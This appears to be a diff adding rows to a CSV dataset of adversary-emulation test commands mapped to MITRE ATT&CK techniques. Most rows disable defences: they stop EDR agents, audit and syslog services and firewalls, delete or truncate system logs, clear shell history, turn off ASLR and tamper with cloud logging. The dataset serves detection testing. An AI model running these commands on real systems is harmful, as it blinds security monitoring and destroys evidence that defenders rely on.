+Invoke-WordlistScan -Target ""http://localhost"" -Wordlist ""PathToAtomicsFolder/T1595.003/src/wordlist.txt"" -Timeout ""5"" -OutputFile ""$env:TMPDIR/wordlist_scan.txt""
+Write-Host ""Scan complete. Results saved to: $env:TMPDIR/wordlist_scan.txt""",T1595.003,Active Scanning: Wordlist Scanning
+curl -k https://ipinfo.io/,T1614,System Location Discovery
+locale,T1614.001,System Location Discovery: System Language Discovery
+localectl status,T1614.001,System Location Discovery: System Language Discovery
+[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale,T1614.001,System Location Discovery: System Language Discovery
+"env | grep LANG
+printenv LANG
+set | grep LANG",T1614.001,System Location Discovery: System Language Discovery
+lsmod,T1652,Device Driver Discovery
+"find /lib/modules/$(uname -r)/kernel/drivers -name ""*.ko*""",T1652,Device Driver Discovery
+"curl -skI --proxy http://127.0.0.1:8080 http://example.com > /tmp/curl_out.txt
+grep ""X-Atomic"" /tmp/curl_out.txt || (cat /tmp/curl_out.txt && exit 1)
+curl -sk --proxy http://127.0.0.1:8080 http://example.com > /tmp/atomic_t1659_page.html
+grep -q ""Atomic T1659 Injection"" /tmp/atomic_t1659_page.html || (head -20 /tmp/atomic_t1659_page.html; exit 1)",T1659,Content Injection
+sudo systemctl stop systemd-journald #disables journal logging,T1685,Disable or Modify Tools
+sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf,T1685,Disable or Modify Tools
+systemctl stop rsyslog ; systemctl disable rsyslog,T1685,Disable or Modify Tools
+"service syslogd stop
+sysrc syslogd_enable=""NO""",T1685,Disable or Modify Tools
+"if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""6"" ];
+then
+  service cbdaemon stop
+  chkconfig off cbdaemon
+else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""7"" ];
+  systemctl stop cbdaemon
+  systemctl disable cbdaemon
+fi",T1685,Disable or Modify Tools
+setenforce 0,T1685,Disable or Modify Tools
+"sudo systemctl stop falcon-sensor.service
+sudo systemctl disable falcon-sensor.service",T1685,Disable or Modify Tools
+history -c,T1685,Disable or Modify Tools
+set +o history,T1685,Disable or Modify Tools
+"echo 1> /proc/sys/kernel/sysrq 
+echo b> /proc/sysrq-trigger ",T1685,Disable or Modify Tools
+"free && echo 3 > /proc/sys/vm/drop_caches && free
+echo 3> /proc/sys/vm/drop_caches ",T1685,Disable or Modify Tools
+"swapon -a 
+sleep 2
+swapoff -a
+sync",T1685,Disable or Modify Tools
+sudo mdatp config real-time-protection --value disabled,T1685,Disable or Modify Tools
+"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
+Connect-VIServer -Server atomic.local -User root -Password pass
+Get-AdvancedSetting -Entity atomic.local -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false
+Disconnect-VIServer -Confirm:$false",T1685,Disable or Modify Tools
+sysctl -w kernel.randomize_va_space=0,T1685,Disable or Modify Tools
+"sed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf
+if [ -f ""/etc/auditd.conf"" ];
+then sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf
+else sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf
+fi 
+sed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf",T1685,Disable or Modify Tools
+echo '#art_test_1562_006_1' >> /etc/security/audit_event,T1685,Disable or Modify Tools
+"if [ -f ""/etc/syslog.conf"" ];
+then sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf
+fi
+if [ -f ""/etc/rsyslog.conf"" ];
+then sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf
+fi
+if [ -f ""/etc/syslog-ng/syslog-ng.conf"" ];
+then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf
+fi",T1685,Disable or Modify Tools
+"if [ -f ""/etc/syslog.conf"" ];
+then echo '#art_test_1562_006_2' >> /etc/syslog.conf
+fi",T1685,Disable or Modify Tools
+"export AWS_REGION=us-west-2 
+cd $PathToAtomicsFolder/T1685.002/src
+echo ""starting warmup""
+./stratus warmup aws.defense-evasion.cloudtrail-event-selectors
+echo ""starting detonate""
+./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force",T1685.002,Disable or Modify Tools: Disable or Modify Cloud Log
+"export AWS_REGION=us-west-2 
+cd $PathToAtomicsFolder/T1685.002/src
+echo ""starting warmup""
+./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule
+echo ""starting detonate""
+./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force",T1685.002,Disable or Modify Tools: Disable or Modify Cloud Log
+"export AWS_REGION=us-west-2 
+cd $PathToAtomicsFolder/T1685.002/src
+echo ""starting warmup""
+./stratus warmup aws.defense-evasion.vpc-remove-flow-logs
+echo ""starting detonate""
+./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force",T1685.002,Disable or Modify Tools: Disable or Modify Cloud Log
+auditctl -D,T1685.004,Disable or Modify Tools: Disable or Modify Linux Audit System Log
+auditctl -e 0,T1685.004,Disable or Modify Tools: Disable or Modify Linux Audit System Log
+"sudo rm -rf /var/log/system.log
+if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi",T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+"rm -rf /var/log/messages
+rm -rf /var/log/security",T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+"truncate -s 0 /var/log/messages #size parameter shorthand
+truncate --size=0 /var/log/security #size parameter ",T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+"cat /dev/null > /var/log/messages #truncating the file to zero bytes
+cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)",T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+echo '' > /var/log/messages,T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+unlink /var/log/messages,T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+"sudo rm /var/log/journal/* #physically deletes the journal files, and not just their content
+sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place",T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+echo 0> /var/spool/mail/root,T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+echo 0> /var/log/secure,T1685.006,Disable or Modify Tools: Clear Linux or Mac System Logs
+ufw disable,T1686,Disable or Modify System Firewall
+"service pf stop
+service pf disable",T1686,Disable or Modify System Firewall
+systemctl stop ufw,T1686,Disable or Modify System Firewall
+ufw logging off,T1686,Disable or Modify System Firewall
+"ufw prepend deny from 1.2.3.4
+ufw status numbered",T1686,Disable or Modify System Firewall
+"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f -
+pfctl -a pf-rules -s rules",T1686,Disable or Modify System Firewall
+"echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules
+grep ""# THIS IS A COMMENT"" /etc/ufw/user.rules",T1686,Disable or Modify System Firewall
+"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf
+grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf",T1686,Disable or Modify System Firewall
+"echo ""# THIS IS A COMMENT"" >> /etc/ufw/sysctl.conf
+grep ""# THIS IS A COMMENT"" /etc/ufw/sysctl.conf",T1686,Disable or Modify System Firewall
+"echo ""# THIS IS A COMMENT"" >> /etc/default/ufw
+grep ""# THIS IS A COMMENT"" /etc/default/ufw",T1686,Disable or Modify System Firewall
+tail /var/log/ufw.log,T1686,Disable or Modify System Firewall
+"iptables-save > /tmp/iptables.rules
+iptables -F",T1686,Disable or Modify System Firewall
+iptables -D OUTPUT -p tcp --dport 21 -j DROP,T1686,Disable or Modify System Firewall
+"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
+Connect-VIServer -Server atomic.local -User root -Password pass
+(Get-EsxCli -VMHost atomic.local -V2).software.acceptance.set.Invoke(@{level = ""CommunitySupported""})
+Disconnect-VIServer -Confirm:$false",T1689,Downgrade Attack
+"export HISTCONTROL=ignoreboth
+whoami",T1690,Prevent Command History Logging
+"export HISTSIZE=0
+whoami",T1690,Prevent Command History Logging
+"cp $HISTFILE $HISTFILE.OLD
+if ((${#HISTFILE[@]})); then echo $HISTFILE; fi
+echo """" > $HISTFILE
+if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo ""$HISTFILE is larger than 1k""; fi
+ls -la $HISTFILE 
+cat $HISTFILE
+history -c 
+if [ $(history |wc -l) -eq 1 ]; then echo ""History cache cleared""; fi",T1690,Prevent Command History Logging
+"TEST=$(echo $HISTCONTROL)
+if [ ""$HISTCONTROL"" != ""ignoreboth"" ]; then export HISTCONTROL=""ignoreboth""; fi
+history -c 
+ls -la $HISTFILE # "" ls -la $HISTFILE""
+if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi
+if [ ""$HISTCONTROL"" != ""erasedups"" ]; then export HISTCONTROL=""erasedups""; fi
+history -c 
+ls -la $HISTFILE
+ls -la $HISTFILE
+ls -la $HISTFILE
+if [ $(history |wc -l) -eq 2 ]; then echo ""Their is only one entry for ls -la $HISTFILE""; fi",T1690,Prevent Command History Logging
+"TEST=$(echo $HISTFILESIZE)
+echo $HISTFILESIZE
+export HISTFILESIZE=0
+echo ""runnning some commands to populate the history""
+whoami
+groups
+if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi",T1690,Prevent Command History Logging
+"echo $HISTSIZE
+export HISTSIZE=0
+echo ""runnning some commands to populate the history""
+whoami
+groups
+if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH"";  fi",T1690,Prevent Command History Logging
+"TEST=$(echo $HISTFILE)
+echo $HISTFILE
+export HISTFILE=""/dev/null""
+echo ""runnning some commands to populate the history""
+whoami
+groups
+if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT"";  fi",T1690,Prevent Command History Logging
+"echo $HISTFILE
+export HISTFILE=""/dev/null""
+if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi",T1690,Prevent Command History Logging
+"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='ls*:rm*:ssh*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi
+history -c 
+ls -la $HISTFILE
+ls -la ~/.bash_logout
+if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi
+unset HISTIGNORE
+if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi
+history -c 
+whoami
+groups
+if [ $(history |wc -l) -eq 0 ]; then echo ""History cache is empty""; fi",T1690,Prevent Command History Logging
